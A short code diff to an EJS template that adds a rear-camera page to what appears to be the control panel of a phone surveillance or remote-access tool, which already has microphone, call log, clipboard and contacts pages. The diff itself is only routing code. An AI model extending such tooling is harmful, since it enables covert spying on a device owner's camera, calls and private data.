@@ -20,6 +20,7 @@
                 </script>
                 <% 
                     if(page === "microphone") { %><% include deviceManagerPages/microphone.ejs %><% }
+                    else if(page === "rearcam") {%><% include deviceManagerPages/rearcam.ejs %><% }
                     else if(page === "calls") { %><% include deviceManagerPages/call_log.ejs %><% }
                     else if(page === "clipboard") { %><% include deviceManagerPages/clipboard_log.ejs %><% }
                     else if(page === "contacts") { %><% include deviceManagerPages/contacts.ejs %><% }
